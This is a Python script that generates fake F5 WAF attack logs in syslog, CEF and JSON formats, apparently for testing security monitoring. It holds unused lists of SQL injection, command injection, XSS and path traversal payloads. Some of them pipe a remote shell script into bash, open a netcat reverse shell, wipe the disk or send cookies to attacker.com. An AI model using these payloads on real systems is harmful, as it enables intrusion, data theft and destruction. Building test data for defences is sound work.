import random
import json
from datetime import datetime, timedelta

# Function to generate a random IP address
def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Function to generate a random hostname
def random_fqdn():
    hostnames = ['bigip', 'device', 'server', 'node', 'host', 'system']
    subdomains = ['pme-ds', 'corp', 'prod', 'dev', 'test']
    domains = ['f5', 'example', 'company', 'network', 'intranet']
    tlds = ['com', 'net', 'org', 'io', 'tech']

    return f"{random.choice(hostnames)}-{random.randint(1, 100)}.{random.choice(subdomains)}.{random.choice(domains)}.{random.choice(tlds)}"

#List of Waf Action
waf_actions = ["Allow", "Block", "Challenge", "Log", "Redirect", "Monitor", "Drop", "Notify", "Custom Response", "Rate Limit", "Sanitize", "Transform", "Whitelist", "Blacklist", "Inspect", "Throttle", "IP Blackhole", "Content Filtering", "Response Header Modification"]


# List of predefined HTTP policy names
http_policy_names = [
    "/Common/topaz4-web4",
    "/Common/security_policy_1",
    "/Common/security_policy_2",
    "/Common/advanced_security",
    "/Common/default_security_policy",
    "/Common/strict_policy",
    "/Common/relaxed_policy",
    "/Common/low_risk_policy",
    "/Common/high_risk_policy",
    "/Common/custom_policy"
]

#list of webkitengines
webkit_engines = [
    "AppleWebKit",
    "Blink",
    "KHTML",
    "Safari",
    "Chromium",
    "QtWebKit",
    "Android WebKit",
    "PlayStation WebKit",
    "BlackBerry WebKit",
    "Tizen WebKit",
    "WebKitGTK",
    "Epiphany",
    "PhantomJS",
    "UCWebKit",
    "Adobe AIR WebKit"
]


# Function to generate a random string of a specified length
def random_string(length):
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(letters) for _ in range(length))

def random_user_agent():
    browsers = ['Mozilla/5.0', 'Chrome/99.0', 'Safari/14.0', 'Opera/74.0']
    os_types = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'Linux x86_64', 'X11; Ubuntu; Linux x86_64']
    browser_version = str(random.randint(50, 99))
    os_version = str(random.randint(0, 15))
    
    return f"{random.choice(browsers)} ({random.choice(os_types)}) {random.choice(webkit_engines)}/{browser_version}.0 (KHTML, like Gecko) Version/{os_version}.0"

sqlpayloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR ''='",
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1#",
    "admin'--",
    "' OR '1'='1'--",
    "' OR 1=1-- -",
    "' UNION SELECT null, null--",
]

cooomand_injection_payloads = [
    "; ls",
    "; whoami",
    "; uname -a",
    "; id",
    "; cat /etc/passwd",
    "|| ls",
    "&& ls",
    "| ls",
    "`ls`",
    "$(ls)",
    "& whoami",
    "; ping -c 4 8.8.8.8",
    "; curl http://evil.com",
    "; wget http://malicious.com/malware",
    "; nslookup example.com",
    "; sleep 10",
    "; rm -rf /",
    "; touch /tmp/exploit",
    "; ifconfig",
    "; ps aux",
    "; netstat -an",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "; echo 'exploit' > /tmp/exploit.txt",
    "; chmod 777 /tmp/exploit",
    "; killall -9 httpd",
    "; shutdown -h now",
    "& dir",
    "& ipconfig",
    "& net user",
    "& netstat -an",
    "& tasklist",
    "& whoami",
    "& shutdown -s",
    "& curl http://attacker.com",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls > /tmp/output.txt",
    "; cat /etc/passwd | grep root",
    "; nc -lvp 4444 > /tmp/output.txt",
    "; echo 'Hello' | mail -s 'Subject' attacker@evil.com",
    "; curl http://evil.com/shell.sh | bash",
    "; perl -e 'print `/etc/passwd`'",
    "; python -c 'import os; os.system(\"ls\")'",
    "; ls && whoami",
    "; uname -a || id",
    "| ls; whoami",
    "`ls; whoami`",
    "$(ls; whoami)",
    "; sleep 10",
    "; ping -c 10 127.0.0.1",
    "; timeout 10",
    "& timeout /t 10",
    "| ping -n 10 localhost"
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "<input type='text' value='' onfocus='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type='submit'></form>",
    "<video src='x' onerror='alert(1)'></video>",
    "<audio src='x' onerror='alert(1)'></audio>",
    "<details open ontoggle='alert(1)'></details>",
    "<marquee onstart='alert(1)'>",
    "<table background='javascript:alert(1)'>",
    "<div onpointerover='alert(1)'>Hover me</div>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "javascript:alert(1)",
    "onmouseover='alert(1)'",
    "';alert(String.fromCharCode(88,83,83));//",
    "<script>confirm('XSS')</script>",
    "<img src=x onerror=alert(document.cookie);>",
    "<svg><script>alert('XSS')</script></svg>",
    "'';!--\"<XSS>=&{()}",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<img src=x onerror=this.src='http://attacker.com/?cookie='+document.cookie>",
    "<input onfocus=alert(1) autofocus>",
    "<button onclick=alert(1)>Click me</button>",
    "<img src='#' onerror=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<div style=background-image:url('javascript:alert(1)')>",
    "<base href='javascript:alert(1)//'>"
]

file_inclusion_payloads = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd",
    "/proc/self/environ",
    "../../../../etc/shadow",
    "../../../../../../etc/shadow",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "/windows/system32/drivers/etc/hosts",
    "../../../../../../../../windows/win.ini",
    "/windows/win.ini",
    "../../../../../../../../boot.ini",
    "/windows/system.ini",
    "../../../../../../../../windows/system.ini",
    "../../../../../../../../usr/local/apache2/conf/httpd.conf",
    "/usr/local/apache2/conf/httpd.conf",
    "../../../../../../../../usr/local/apache2/conf/extra/httpd-vhosts.conf",
    "/usr/local/apache2/conf/extra/httpd-vhosts.conf",
    "../../../../../../../../var/www/html/index.php",
    "/var/www/html/index.php",
    "../../../../../../../../var/log/apache2/access.log",
    "/var/log/apache2/access.log",
    "../../../../../../../../var/log/apache2/error.log",
    "/var/log/apache2/error.log",
    "../../../../../../../../var/lib/mysql/mysql/user.MYD",
    "/var/lib/mysql/mysql/user.MYD",
    "../../../../../../../../var/lib/mysql/mysql/user.frm",
    "/var/lib/mysql/mysql/user.frm",
    "../../../../../../../../proc/self/fd/0",
    "../../../../../../../../proc/self/fd/1",
    "../../../../../../../../proc/self/fd/2",
    "../../../../../../../../proc/self/cmdline",
    "../../../../../../../../proc/self/stat",
    "../../../../../../../../proc/self/mounts",
    "/../../../../../../../../dev/urandom",
    "/../../../../../../../../dev/null",
    "/../../../../../../../../dev/random",
    "/../../../../../../../../dev/tcp/10.0.0.1/8080",
    "../../../../../../../../../../dev/tcp/localhost/8888",
    "/../../../../../../../../dev/tcp/localhost/4444",
    "../../../../../../../../var/www/index.php?file=/etc/passwd",
    "../../../../../../../../var/www/index.php?page=/etc/passwd",
    "../../../../../../../../index.php?page=/etc/passwd",
    "../../../../../../../../index.php?file=/etc/passwd",
    "../../../../../../../../index.php?path=/etc/passwd"
]



# Function to generate a syslog format log entry
def generate_syslog_log():
    now = datetime.now() - timedelta(days=random.randint(0, 30), hours=random.randint(0, 23), minutes=random.randint(0, 59))
    fqdn = random_fqdn()
    destip = random_ip()
    log = (
        f"<134>{now.strftime('%b %d %H:%M:%S')} {fqdn} ASM:"
        f'unit_hostname="{fqdn}",'
        f'management_ip_address="{random_ip()}",'
        f'http_class_name="{random.choice(http_policy_names)}",'
        f'policy_name="My security policy",'
        f'violations="Attack signature detected",'
        f'support_id="{random.randint(0, 2**64 - 1)}",'
        f'request_status="{random.choice(waf_actions)}",'
        f'response_code="{random.randint(200, 500)}",'
        f'ip_client="{random_ip()}",'
        f'route_domain="{random.randint(0, 100)}",'
        f'method="{random.choice(["GET", "POST"])}",'
        f'protocol="HTTP",'
        f'query_string="key1=val1&key2=val2",'
        f'x_forwarded_for_header_value="{random_ip()}",'
        f'sig_ids="{random.randint(1, 999999999)}",'
        f'sig_names="Automated client access %22wget%22",'
        f'date_time="{now.strftime("%Y-%m-%d %H:%M:%S")}",'
        f'severity="Error",'
        f'attack_type="Non-browser client",'
        f'geo_location="USA/NY",'
        f'ip_address_intelligence="Botnets, Scanners",'
        f'username="Admin",'
        f'session_id="{random_string(16)}",'
        f'src_port="{random.randint(1024, 65535)}",'
        f'dest_port="{random.randint(1, 65535)}",'
        f'dest_ip="{destip}",'
        f'sub_violations="Bad HTTP version, Null in request",'
        f'virus_name="Melissa",'
        f'uri="/",'
        f'request="GET / HTTP/1.0\\r\\nUser-Agent:  {random_user_agent()}\\r\\nAccept: */*\\r\\nHost: {destip}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n",'
        f'headers="Host: myhost.com; Connection: close",'
        f'response="HTTP/1.1 200 OK Content-type: text/html Content-Length: 7 <html/>",'
        f'violation_details="<?xml version=\'1.0\' encoding=\'UTF-8\'?><BAD_MSG><request-violations><violation><viol_index>14</viol_index><viol_name>VIOL_HTTP_PROTOCOL</viol_name><http_sanity_checks_status>65536</http_sanity_checks_status><http_sub_violation_status>65536</http_sub_violation><http_sub_violation>SFRUUCB2ZXJzaW9uIG5vdCBmb3VuZA==</http_sub_violation></violation></request-violations></BAD_MSG>"'
    )
    return log

# Function to generate a CEF format log entry
def generate_cef_log():
    now = datetime.now() - timedelta(days=random.randint(0, 30), hours=random.randint(0, 23), minutes=random.randint(0, 59))
    fqdn = random_fqdn()
    destip = random_ip()
    log = (
        f"<131>{now.strftime('%b %d %H:%M:%S')} {fqdn} ASM:CEF:0|F5|ASM|11.3.0|200021069|"
        f"Automated client access |5|dvchost={fqdn} dvc={random_ip()} "
        f"cs1={random_string(10)} cs1Label=http_class_name cs2=random.choice(http_policy_names) "
        f"cs2Label=http_class_name deviceCustomDate1={now.strftime('%b %d %Y %H:%M:%S')} "
        f"deviceCustomDate1Label=policy_apply_date externalId={random.randint(1000000000000000000, 9999999999999999999)} "
        f"act=blocked cn1=0 cn1Label=src={random_ip()} spt={random.randint(1024, 65535)} "
        f"dst={destip} dpt=80 requestMethod={random.choice(["GET", "POST"])} app=HTTP cs5=N/A cs5Label=x_forwarded_for_header_value "
        f"rt={now.strftime('%b %d %Y %H:%M:%S')} deviceExternalId=0 cs4=Non-browser Client "
        f"cs4Label=attack_type cs6=N/A cs6Label=geo_location c6a1= c6a1Label=device_address "
        f"c6a2= c6a2Label=source_address c6a3= c6a3Label=destination_address c6a4=N/A "
        f"c6a4Label=ip_address_intelligence msg=N/A suid={random_string(24)} suser=N/A "
        f"request=/ cs3Label=full_request cs3=GET / HTTP/1.0\\r\\nUser-Agent: {random_user_agent()}\\r\\n"
        f"Accept: /\\r\\nHost: {random_ip()}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n"
    )
    return log
# Function to generate a JSON format log entry
def generate_json_log():
    now = datetime.now().isoformat()
    log = {
        "@timestamp": now + "Z",
        "_visitor_id": random_string(10),
        "action": "allow",
        "app": "test",
        "app_type": "test-io-demo",
        "as_number": str(random.randint(1000, 9999)),
        "as_org": "test b.v.",
        "asn": f"test b.v.({random.randint(1000, 9999)})",
        "authority": "demo.test.net",
        "bot_defense": {
            "automation_type": "Token Missing",
            "insight": "MALICIOUS",
            "recommendation": "Action_alert",
            "status_code": "0"
        },
        "browser_type": "Opera",
        "city": "city",
        "cluster_name": "test-io",
        "country": "NL",
        "dcid": random_string(10),
        "device_type": "Other",
        "domain": "demo.test.net",
        "dst": "",
        "dst_instance": "",
        "dst_ip": random_ip(),
        "dst_port": "0",
        "dst_site": "",
        "hostname": f"master-{random.randint(1, 10)}",
        "http_version": "HTTP/1.1",
        "is_new_dcid": False,
        "kubernetes": {
            "container_name": "test",
            "host": "master",
            "labels": {
                "app": "test"
            },
            "namespace_name": "test-system",
            "pod_id": f"e358ed2d-{random_string(10)}",
            "pod_name": "test"
        },
        "latitude": "0.0000",
        "longitude": "0.0000",
        "messageid": random_string(36),
        "method": "GET",
        "namespace": "demo-shop",
        "network": random_ip(),
        "original_headers": ["host", "method", "scheme", "user-agent"],
        "path": "/",
        "region": "NL-NH",
        "req_headers": json.dumps({
            "Cookie": f"shop_session-id={random_string(36)}",
            "Host": "demo.test.net",
            "Method": "GET",
            "Scheme": "https",
            "User-Agent":  random_user_agent(),
            "X-Forwarded-For": random_ip()
        }),
        "req_headers_size": random.randint(500, 1000),
        "req_id": random_string(36),
        "req_params": "",
        "req_path": "/",
        "req_size": str(random.randint(500, 1000)),
        "rsp_code": "0",
        "rsp_code_class": "UNKNOWN",
        "rsp_size": str(random.randint(500, 1000)),
        "src": random_ip(),
        "src_port": str(random.randint(1000, 65535)),
        "timestamp": now,
        "url": f"https://demo.test.net/{random_string(10)}",
        "user": "admin"
    }
    return json.dumps(log)

# Function to generate logs in different formats based on user input
def generate_logs(num_logs=10, log_format="json"):
    if log_format == "syslog":
        return [generate_syslog_log() for _ in range(num_logs)]
    elif log_format == "cef":
        return [generate_cef_log() for _ in range(num_logs)]
    elif log_format == "json":
        return [generate_json_log() for _ in range(num_logs)]
    else:
        print("Invalid log format selected.")
        return []

# Ask user for log format
user_input = input("Enter the log format (syslog, cef, json): ").strip().lower()
num_logs = int(input("Enter the number of logs to generate: "))

# Generate logs
generated_logs = generate_logs(num_logs, user_input)

# Print generated logs
print(f"--- {user_input.upper()} LOGS ---")
for entry in generated_logs:
    print(entry)
